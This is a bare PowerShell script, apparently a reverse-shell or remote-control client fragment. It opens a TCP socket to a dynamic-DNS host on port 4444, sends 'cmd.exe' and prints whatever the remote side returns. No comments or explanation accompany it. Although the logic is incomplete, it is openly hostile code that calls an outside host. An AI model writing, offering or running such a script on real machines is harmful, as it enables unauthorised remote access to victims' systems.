$ip = "suber122.duckdns.org"
$port = 4444
$sendCommand = "cmd.exe"

$socket = New-Object System.Net.Sockets.TcpClient($ip,$port)
$stream = $socket.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

$writer.WriteLine($sendCommand)
$writer.Flush()

$output = $reader.ReadLine()

while($output -ne $null){
    $output
    $output = $reader.ReadLine()
}

$socket.Close()
